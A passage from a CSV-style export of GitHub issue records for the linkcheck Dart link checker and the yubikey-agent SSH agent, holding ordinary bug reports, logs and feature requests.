file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/clut.dart:8:4: Error: A value of type 'dart.core::int' can't be assigned to a variable of type 'dart.core::String'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::String'.
  [4, '000080'],
   ^
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/clut.dart:9:4: Error: A value of type 'dart.core::int' can't be assigned to a variable of type 'dart.core::String'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::String'.
  [5, '800080'],
   ^
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/clut.dart:10:4: Error: A value of type 'dart.core::int' can't be assigned to a variable of type 'dart.core::String'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::String'.
  [6, '008080'],
   ^
```

I realize that the issue is with https://github.com/DirectMyFile/console.dart, but if that package can't be updated, maybe `linkcheck` should use another package?

cc @kwalrath @kevmoo ",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/12/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/12/comments,https://api.github.com/repos/filiph/linkcheck/issues/12/events,https://github.com/filiph/linkcheck/issues/12,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/11,315277354,MDU6SXNzdWUzMTUyNzczNTQ=,11,Save results as json,587527,open,FALSE,NA,NA,6,2018-04-17T23:31:23Z,2021-03-15T06:56:33Z,NA,NONE,NA,Is there a way to save linkcheck results as JSON?,NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/11/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/11/comments,https://api.github.com/repos/filiph/linkcheck/issues/11/events,https://github.com/filiph/linkcheck/issues/11,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/10,307305184,MDU6SXNzdWUzMDczMDUxODQ=,10,Invalid argument(s): Text ... must be 168 characters long?,70380,closed,FALSE,919717,NA,2,2018-03-21T15:52:31Z,2019-09-30T19:32:37Z,2019-09-30T19:32:37Z,NONE,NA,"link check told me to do this:

> INTERNAL ERROR: Sorry! Please open https://github.com/filiph/linkcheck/issues/new in your favorite browser and copy paste the following output there:
> 
> Invalid argument(s): Text ""`<link rel=""alternate"" type=""application/rss+xml"" title=""ArtLung &raquo; Limones 🍋 Comments Feed"" href=""http://artlung.com/blog/2018/02/22/limones-%f0%9f%8d%8b/feed/"" />`"" must be 168 characters long.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/10/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/10/comments,https://api.github.com/repos/filiph/linkcheck/issues/10/events,https://github.com/filiph/linkcheck/issues/10,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/9,279813062,MDU6SXNzdWUyNzk4MTMwNjI=,9,Add 'max depth' argument,17034,open,FALSE,NA,NA,0,2017-12-06T16:15:10Z,2017-12-06T16:15:10Z,NA,NONE,NA,"When walking the package site (for instance) there are a lot of random walks that can yield a lot of URLs.

It'd be nice to say ""walk at most 5 deep from the source URL""",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/9/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/9/comments,https://api.github.com/repos/filiph/linkcheck/issues/9/events,https://github.com/filiph/linkcheck/issues/9,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/8,242415557,MDU6SXNzdWUyNDI0MTU1NTc=,8,Normalize (percent-encode) anchor links,919717,open,FALSE,NA,NA,0,2017-07-12T15:11:23Z,2017-07-12T15:11:23Z,NA,OWNER,NA,"A link like `https://flutter.io/widgets/interaction/#Touch interactions` is the same as `https://flutter.io/widgets/interaction/#Touch%20interactions`. 

Right now, `linkcheck` will report a ""HTTP 200 but missing anchor"" warning when following a https://flutter.io/widgets/interaction/#Touch%20interactions link and when the target element looks like `<h1 id=""Touch interactions"">Touch interactions</h1>`.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/8/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/8/comments,https://api.github.com/repos/filiph/linkcheck/issues/8/events,https://github.com/filiph/linkcheck/issues/8,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/7,207883899,MDU6SXNzdWUyMDc4ODM4OTk=,7,Release linkcheck as a standalone executable,919717,closed,FALSE,NA,NA,11,2017-02-15T18:12:38Z,2021-01-22T17:24:56Z,2021-01-22T17:24:56Z,OWNER,NA,"Something similar to https://github.com/sass/dart-sass/blob/master/tool/grind.dart. Includes the Dart VM so installation is [quite easy](https://github.com/sass/dart-sass#standalone).

Maybe wait on full AOT support and release actual binaries (without DartVM)?",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/7/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/7/comments,https://api.github.com/repos/filiph/linkcheck/issues/7/events,https://github.com/filiph/linkcheck/issues/7,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/6,207876092,MDU6SXNzdWUyMDc4NzYwOTI=,6,Add ability to check external sites only for 404s,919717,open,FALSE,NA,NA,0,2017-02-15T17:42:22Z,2017-02-15T17:42:22Z,NA,OWNER,NA,"Sometimes, external sites do 500 or similar, which isn't helpful. But 404s are.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/6/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/6/comments,https://api.github.com/repos/filiph/linkcheck/issues/6/events,https://github.com/filiph/linkcheck/issues/6,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/5,196488064,MDU6SXNzdWUxOTY0ODgwNjQ=,5,skipped data url reported as invalid,4140793,closed,FALSE,919717,NA,2,2016-12-19T18:32:40Z,2016-12-20T17:05:48Z,2016-12-20T06:24:41Z,COLLABORATOR,NA,"When linkcheck is run over https://webdev.dartlang.org/, the following is reported:
```
http://localhost:4001/angular/api/static-assets/styles.css
- (391:24) url(...) => data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'><path fill=' (invalid URL)
```
even if this skip pattern is used:
```
^data
```
Note that the skip pattern _is_ being used:
```
Done checking: http://localhost:4001/angular/api/static-assets/styles.css (HTTP 200) => 3 links
- will not be checking: data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'><path fill=' - URL 'data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'><path fill='' skipped because it was matched by the following regular expressions of skip file './scripts/config/linkcheck-skip-list.txt': ^data (line 12)
```
But the `data` url is none-the-less being reported as invalid. Here is an actual sample entry:
```
background-image: url(""data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'><path fill='#DDDDDD' d='M6.7,4L5.7,4.9L8.8,8l-3.1,3.1L6.7,12l4-4L6.7,4z'/></svg>"");
```

Skipped links probably shouldn't have validity checks performed on them. (On the hand, I'd also be curious to know why the data url is being considered invalid.)",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/5/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/5/comments,https://api.github.com/repos/filiph/linkcheck/issues/5/events,https://github.com/filiph/linkcheck/issues/5,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/4,196133111,MDU6SXNzdWUxOTYxMzMxMTE=,4,Skip patterns ending with # do not seem to work.,4140793,closed,FALSE,919717,NA,2,2016-12-16T19:11:18Z,2016-12-17T01:09:44Z,2016-12-17T01:09:44Z,COLLABORATOR,NA,"I've been testing the skip pattern

    /angular/guide/server-communication#

over [site-webdev](https://github.com/dart-lang/site-webdev).

Here is part of the debug output:
```
Crawl will start on the following URLs: [http://localhost:4001/]
Crawl will check pages only on URLs satisfying: {http://localhost:4001/**}
Crawl will skip links that match patterns: UrlSkipper</angular/api/.*apiFilter, data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg', /angular/api/, /angular/guide/router(\.html)?($|#), /angular/guide/change-log.html$, /angular/cookbook/, /angular/guide/appmodule.html$, /angular/guide/server-communication#, /angular/api/static-assets/fonts, /angular/api/(docs|examples)/, /angular/api/.*/index/>
Crawl will check the following servers (and their robots.txt) first: {localhost:4001}
...

http://localhost:4001/angular/guide/server-communication
- (533:18) 'RxJS Obs..' => http://localhost:4001/angular/guide/server-communication#rxjs (HTTP 200 but missing anchor)
- (535:18) 'Enabling..' => http://localhost:4001/angular/guide/server-communication#enable-rxjs-operators (HTTP 200 but missing anchor)
...

Stats:
   14465 links
     331 destination URLs
     347 URLs ignored
      12 warnings
       0 errors
```
It should be skipping `.../server-communication#rxjs`.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/4/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/4/comments,https://api.github.com/repos/filiph/linkcheck/issues/4/events,https://github.com/filiph/linkcheck/issues/4,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/3,194434033,MDU6SXNzdWUxOTQ0MzQwMzM=,3,avoid repeating invalid links,4140793,open,FALSE,919717,NA,2,2016-12-08T20:18:55Z,2016-12-15T21:46:03Z,NA,COLLABORATOR,NA,"Run the command `linkcheck https://webdev.dartlang.org`. Part of the output generated will be as shown below. Note that the two 404s are repeated 5 times. It would be nice to list the erroneous links only once.
```
https://webdev.dartlang.org/angular/guide
- (534:7) 'Cookbook' => https://webdev.dartlang.org/angular/cookbook/ (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/cookbook/ (301)
    - /angular/cookbook (404)
- (556:21) 'Change Log' => https://webdev.dartlang.org/angular/guide/change-log.html (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/guide/change-log.html (301)
    - /angular/guide/change-log (404)
- (534:7) 'Cookbook' => https://webdev.dartlang.org/angular/cookbook/ (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/cookbook/ (301)
    - /angular/cookbook (404)
- (556:21) 'Change Log' => https://webdev.dartlang.org/angular/guide/change-log.html (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/guide/change-log.html (301)
    - /angular/guide/change-log (404)
- (534:7) 'Cookbook' => https://webdev.dartlang.org/angular/cookbook/ (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/cookbook/ (301)
    - /angular/cookbook (404)
- (556:21) 'Change Log' => https://webdev.dartlang.org/angular/guide/change-log.html (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/guide/change-log.html (301)
    - /angular/guide/change-log (404)
- (534:7) 'Cookbook' => https://webdev.dartlang.org/angular/cookbook/ (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/cookbook/ (301)
    - /angular/cookbook (404)
- (556:21) 'Change Log' => https://webdev.dartlang.org/angular/guide/change-log.html (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/guide/change-log.html (301)
    - /angular/guide/change-log (404)
- (534:7) 'Cookbook' => https://webdev.dartlang.org/angular/cookbook/ (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/cookbook/ (301)
    - /angular/cookbook (404)
- (556:21) 'Change Log' => https://webdev.dartlang.org/angular/guide/change-log.html (HTTP 301 => 404)
  - redirect path:
    - https://webdev.dartlang.org/angular/guide/change-log.html (301)
    - /angular/guide/change-log (404)
```",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/3/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/3/comments,https://api.github.com/repos/filiph/linkcheck/issues/3/events,https://github.com/filiph/linkcheck/issues/3,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/2,194423223,MDU6SXNzdWUxOTQ0MjMyMjM=,2,support link whitelisting,4140793,closed,FALSE,919717,NA,10,2016-12-08T19:30:22Z,2016-12-16T18:32:48Z,2016-12-16T00:12:16Z,COLLABORATOR,NA,"As an example of where this would be useful is when running the checker over https://webdev.dart-lang.org. We currently do not yet have an Angular guide for the Router, but we do have some Angular pages that already link into the (soon to be created) Router page. It would be great if we could whitelist links to the router page.

As an example the broken-link-checker has an [excludeKeywords](https://www.npmjs.com/package/broken-link-checker#optionsexcludedkeywords) option. We use it like this under angular.io (note the value of the `exclude` array variable):
```js
gulp.task('link-checker', () => {
  var method = 'get'; // the default 'head' fails for some sites
  var exclude = [
    // Dart API docs aren't working yet; ignore them
    '*/dart/latest/api/*',
    // Somehow the link checker sees ng1 {{...}} in the resource page; ignore it
    'resources/%7B%7Bresource.url%7D%7D',
    // API docs have links directly into GitHub repo sources; these can
    // quickly become invalid, so ignore them for now:
    '*/angular/tree/*',
    // harp.json ""bios"" for ""Ryan Schmukler"", URL isn't valid:
    'http://slingingcode.com'
  ];
  var blcOptions = { requestMethod: method, excludedKeywords: exclude};
  return linkChecker({ blcOptions: blcOptions });
});
```

cc @kwalrath @kevmoo ",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/2/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/2/comments,https://api.github.com/repos/filiph/linkcheck/issues/2/events,https://github.com/filiph/linkcheck/issues/2,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/1,190560540,MDU6SXNzdWUxOTA1NjA1NDA=,1,processing ng docs site results in FormatException: Expecting '=',4140793,closed,FALSE,919717,NA,8,2016-11-20T14:17:35Z,2016-12-05T22:27:10Z,2016-12-02T23:21:32Z,COLLABORATOR,NA,"Running linkcheck over the ng docs dev site:
```
linkcheck https://angulardart-org-dev.firebaseapp.com
```
results in
```
.../static-assets/styles.css
Unhandled exception:
FormatException: Expecting '=' (at character 24)
data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' ...
                       ^
```

Context: we're using the dartdoc generated pages for https://github.com/dart-lang/angular2 via https://github.com/dart-lang/site-webdev. Running `linkcheck` over the resulting webdev site resulted in the error above.

cc @kwalrath @ericjim",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/1/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/1/comments,https://api.github.com/repos/filiph/linkcheck/issues/1/events,https://github.com/filiph/linkcheck/issues/1,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/84,860109883,MDExOlB1bGxSZXF1ZXN0NjE3MDcwODg5,84,Upgrade piv-go,581269,open,FALSE,NA,NA,0,2021-04-16T19:34:36Z,2021-04-16T19:34:36Z,NA,CONTRIBUTOR,NA,"Among other things, this pulls in
https://github.com/go-piv/piv-go/pull/75 which makes packaging easier
on NixOS (and probably other linux distros).",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/84/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/84/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/84/events,https://github.com/FiloSottile/yubikey-agent/pull/84,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/84
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/83,845522650,MDU6SXNzdWU4NDU1MjI2NTA=,83,yubikey-agent service fails to start,7785716,open,FALSE,NA,NA,1,2021-03-31T00:21:22Z,2021-03-31T01:05:44Z,NA,NONE,NA,"I installed the AUR package for yubikey-agent on Arch. I can't get the yubikey-agent service to start.

```
❯ systemctl --user status yubikey-agent.service
● yubikey-agent.service - Seamless ssh-agent for YubiKeys
     Loaded: loaded (/usr/lib/systemd/user/yubikey-agent.service; enabled; vendor preset: enabled)
     Active: failed (Result: exit-code) since Tue 2021-03-30 20:02:57 EDT; 18s ago
       Docs: https://filippo.io/yubikey-agent
    Process: 427198 ExecStart=/usr/bin/yubikey-agent -l /run/user/1000/yubikey-agent/yubikey-agent.sock (code=exited, status=226/NAMESPACE)
   Main PID: 427198 (code=exited, status=226/NAMESPACE)

Mar 30 20:02:57 archlinux systemd[4305]: Started Seamless ssh-agent for YubiKeys.
Mar 30 20:02:57 archlinux yubikey-agent[427198]: yubikey-agent.service: Failed to set up mount namespacing: /run/systemd/unit-root/proc: Operation not permitted
Mar 30 20:02:57 archlinux systemd[427198]: yubikey-agent.service: Failed at step NAMESPACE spawning /usr/bin/yubikey-agent: Operation not permitted
Mar 30 20:02:57 archlinux systemd[4305]: yubikey-agent.service: Main process exited, code=exited, status=226/NAMESPACE
Mar 30 20:02:57 archlinux systemd[4305]: yubikey-agent.service: Failed with result 'exit-code'.
```

Any idea what my next step should be? ",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/83/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/83/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/83/events,https://github.com/FiloSottile/yubikey-agent/issues/83,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/82,840112162,MDExOlB1bGxSZXF1ZXN0NjAwMDI1NjM4,82,Migrate to github.com/gopasspw/pinentry,1449175,open,FALSE,NA,NA,0,2021-03-24T19:48:57Z,2021-03-24T19:48:57Z,NA,NONE,NA,"gopass has moved pinentry to a separate go module to allow
for easier re-use and better versioning.

Signed-off-by: Dominik Schulz <dominik.schulz@gauner.org>",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/82/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/82/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/82/events,https://github.com/FiloSottile/yubikey-agent/pull/82,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/82
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/81,830767979,MDU6SXNzdWU4MzA3Njc5Nzk=,81,Required to manually restart pcscd.service each boot,44214212,open,FALSE,NA,NA,1,2021-03-13T01:25:22Z,2021-03-13T11:35:58Z,NA,NONE,NA,"I'm running into an issue of yubikey-agent/ssh-add -L failing to read the contents of the yubikey on each reboot, unless the pcscd.service is manually restarted. Not sure if this is an pcsc or yubikey-agent issue, however, there appears to be no errors thrown by pcscd.{service,socket}.

Installed yubikey-agent using the steps recommended for manual installation. Temporarily disabled SELinux, but the problem still persists.

`systemctl restart pcscd.service` always solves the issue, so it's not a major issue, however, a bit frustrating. I've included some debugging info below. If there is anything else I could provide to help please let me know.

```
$ uname -a
Linux $HOST 5.10.22-200.fc33.x86_64 #1 SMP Tue Mar 9 22:05:08 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```
```
$ ssh-add -L
error fetching identities: agent refused operation
```
```
$ systemctl --user status yubikey-agent.service

yubikey-agent.service - Seamless ssh-agent for YubiKeys
     Loaded: loaded (/home/rtmoran/.config/systemd/user/yubikey-agent.service; enabled; vendor preset: disabled)
     Active: active (running) since Fri 2021-03-12 20:19:31 EST; 19min ago
       Docs: https://filippo.io/yubikey-agent
   Main PID: 6703 (yubikey-agent)
      Tasks: 7 (limit: 18707)
     Memory: 1.3M
        CPU: 17ms
     CGroup: /user.slice/user-1000.slice/user@1000.service/yubikey-agent.service
             └─6703 /usr/local/bin/yubikey-agent -l /run/user/1000/yubikey-agent/yubikey-agent.sock

Mar 12 20:19:31 rtm-fedora systemd[2139]: Started Seamless ssh-agent for YubiKeys.
Mar 12 20:19:31 rtm-fedora yubikey-agent[6703]: selinux: avc:  netlink recvfrom: error 9
Mar 12 20:19:36 rtm-fedora yubikey-agent[6703]: 2021/03/12 20:19:36 Connecting to the YubiKey...
Mar 12 20:19:36 rtm-fedora yubikey-agent[6703]: 2021/03/12 20:19:36 agent 11: could not reach YubiKey: connecting to smart card: the smart card cannot be accessed because of other connections outstanding
```
```
$ systemctl status pcscd.service  
                                                                                                                                                                        
pcscd.service - PC/SC Smart Card Daemon
     Loaded: loaded (/usr/lib/systemd/system/pcscd.service; indirect; vendor preset: disabled)
     Active: active (running) since Fri 2021-03-12 19:57:26 EST; 44min ago
TriggeredBy: ● pcscd.socket
       Docs: man:pcscd(8)
   Main PID: 1510 (pcscd)
      Tasks: 18 (limit: 18707)
     Memory: 4.9M
        CPU: 10.454s
     CGroup: /system.slice/pcscd.service
             └─1510 /usr/sbin/pcscd --foreground --auto-exit

Mar 12 19:57:26 rtm-fedora systemd[1]: Started PC/SC Smart Card Daemon.
```
```
$ systemctl status pcscd.socket 

pcscd.socket - PC/SC Smart Card Daemon Activation Socket
     Loaded: loaded (/usr/lib/systemd/system/pcscd.socket; enabled; vendor preset: enabled)
     Active: active (running) since Fri 2021-03-12 19:57:26 EST; 45min ago
   Triggers: ● pcscd.service
     Listen: /run/pcscd/pcscd.comm (Stream)
      Tasks: 0 (limit: 18707)
     Memory: 0B
        CPU: 0
     CGroup: /system.slice/pcscd.socket

Mar 12 19:57:26 rtm-fedora systemd[1]: Listening on PC/SC Smart Card Daemon Activation Socket.
```
```
$ journalctl -b | grep -i yubikey-agent
Mar 12 20:19:31 rtm-fedora yubikey-agent[6703]: selinux: avc:  netlink recvfrom: error 9
Mar 12 20:19:36 rtm-fedora yubikey-agent[6703]: 2021/03/12 20:19:36 Connecting to the YubiKey...
Mar 12 20:19:36 rtm-fedora yubikey-agent[6703]: 2021/03/12 20:19:36 agent 11: could not reach YubiKey: connecting to smart card: the smart card cannot be accessed because of other connections outstanding
```
```
$ journalctl -b | grep -i pcscd
Mar 12 19:57:26 rtm-fedora audit[1]: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=system_u:system_r:init_t:s0 msg='unit=pcscd comm=""systemd"" exe=""/usr/lib/systemd/systemd"" hostname=? addr=? terminal=? res=success'
```",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/81/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/81/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/81/events,https://github.com/FiloSottile/yubikey-agent/issues/81,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/80,810743577,MDU6SXNzdWU4MTA3NDM1Nzc=,80,"Attempting to use yubikey fails: ""could not get public key""",49368915,open,FALSE,NA,NA,0,2021-02-18T04:19:57Z,2021-02-18T04:19:57Z,NA,NONE,NA,"I know that yubikeys not set up with this tool aren't officially supported, but I thought this was odd. Here's the guide I used to set up my yubikey: https://github.com/drduh/YubiKey-Guide#creating-keys.

Output from yubikey-agent when attempting to use the yubikey:
```
2021/02/17 22:45:03 Connecting to the YubiKey...
2021/02/17 22:45:03 agent 11: could not get public key: command failed: smart card error 6a82: data object or application not found
```

Output of `ykman info`:
```
Device type: YubiKey 5 NFC
Serial number: 11417625
Firmware version: 5.2.4
Form factor: Keychain (USB-A)
Enabled USB interfaces: OTP+FIDO+CCID
NFC interface is enabled.

Applications	USB    	NFC
OTP     	Enabled	Enabled	
FIDO U2F	Enabled	Enabled	
OpenPGP 	Enabled	Enabled	
PIV     	Enabled	Enabled	
OATH    	Enabled	Enabled	
FIDO2   	Enabled	Enabled
```",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/80/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/80/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/80/events,https://github.com/FiloSottile/yubikey-agent/issues/80,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/79,809486138,MDU6SXNzdWU4MDk0ODYxMzg=,79,Homebrew Tap is broken,179510,closed,FALSE,NA,NA,4,2021-02-16T17:02:19Z,2021-02-19T10:14:27Z,2021-02-19T10:14:27Z,NONE,NA,"I get the following response from `brew update`:
```
Error: Fetching /opt/homebrew/Library/Taps/filippo.io/homebrew-yubikey-agent failed!
```

Trying to untap/retap will result in a password prompt for Github.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/79/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/79/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/79/events,https://github.com/FiloSottile/yubikey-agent/issues/79,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/78,808717339,MDU6SXNzdWU4MDg3MTczMzk=,78, yubikey-agent -setup does not work,19927701,closed,FALSE,NA,NA,2,2021-02-15T17:37:44Z,2021-03-10T11:13:20Z,2021-03-10T11:13:20Z,NONE,NA,"With the fresh YubiKey 5C NFC on OSX 11.2.1:

```
$ ykman info
Device type: YubiKey 5C NFC
Serial number: REDACTED
Firmware version: 5.2.7
Form factor: Keychain (USB-C)
Enabled USB interfaces: OTP+FIDO+CCID
NFC interface is enabled.

Applications	USB    	NFC
OTP     	Enabled	Disabled
FIDO U2F	Enabled	Enabled
OpenPGP 	Enabled	Enabled
PIV     	Enabled	Enabled
OATH    	Enabled	Enabled
FIDO2   	Enabled	Enabled
```

```
$ yubikey-agent -setup
🔐 The PIN is up to 8 numbers, letters, or symbols. Not just numbers!
❌ The key will be lost if the PIN and PUK are locked after 3 incorrect tries.

Choose a new PIN/PUK:
Repeat PIN/PUK:

🧪 Reticulating splines...
‼️  The default Management Key did not work

If you know what you're doing, reset PIN, PUK, and
Management Key to the defaults before retrying.

If you want to wipe all PIV keys and start fresh,
use --really-delete-all-piv-keys ⚠️
```
What could be a problem?",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/78/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/78/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/78/events,https://github.com/FiloSottile/yubikey-agent/issues/78,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/77,806334331,MDU6SXNzdWU4MDYzMzQzMzE=,77,Yubikey Agent failing to load Manjaro  (Namespace Spawn Error),22932825,closed,FALSE,NA,NA,4,2021-02-11T12:12:47Z,2021-02-11T15:00:24Z,2021-02-11T12:45:26Z,NONE,NA,"I am on Manjaro Linux Kernel 5.10.13-2, yubikey agent is failing to load..

![alt image](https://i.imgur.com/HzCqOZn.png)",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/77/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/77/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/77/events,https://github.com/FiloSottile/yubikey-agent/issues/77,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/76,797784597,MDU6SXNzdWU3OTc3ODQ1OTc=,76,Does this project still supported/maintained?,19927701,closed,FALSE,NA,NA,1,2021-01-31T18:58:08Z,2021-02-01T00:58:34Z,2021-02-01T00:58:34Z,NONE,NA,"Hi!

Thanks for all the efforts you put into this project!
But does this project still supported/maintained?

Are there any future plans or roadmap?

I see Issues just not get any attention and PRs are ignored/closed.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/76/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/76/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/76/events,https://github.com/FiloSottile/yubikey-agent/issues/76,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/75,787334034,MDExOlB1bGxSZXF1ZXN0NTU2MDY3MTMy,75,yubikey-agent: add flag to retrieve management key,6657308,closed,FALSE,NA,NA,0,2021-01-16T03:08:05Z,2021-01-16T03:08:20Z,2021-01-16T03:08:20Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/75/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/75/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/75/events,https://github.com/FiloSottile/yubikey-agent/pull/75,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/75
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/74,782902965,MDU6SXNzdWU3ODI5MDI5NjU=,74,Add feature to release the smart card context on timeout,6657308,open,FALSE,NA,NA,0,2021-01-10T20:40:15Z,2021-01-10T20:40:15Z,NA,NONE,NA,"I am using my Yubikey for both GPG and yubikey-agent and trying to find a descent workaround for the https://github.com/go-piv/piv-go/issues/47 issue. I am fine to loose the PIN caching (I can use libsecret to store the pin for me on the machine I trust) and `killall -HUP yubikey-agent` workaround kind of works, except this command needs to be issued manually. Can we add functionality to release the smart card context on timeout after last key access? This would allow to me configure context auto-release and make yubikey-agent and gpg-agent co-existence a bit easier. 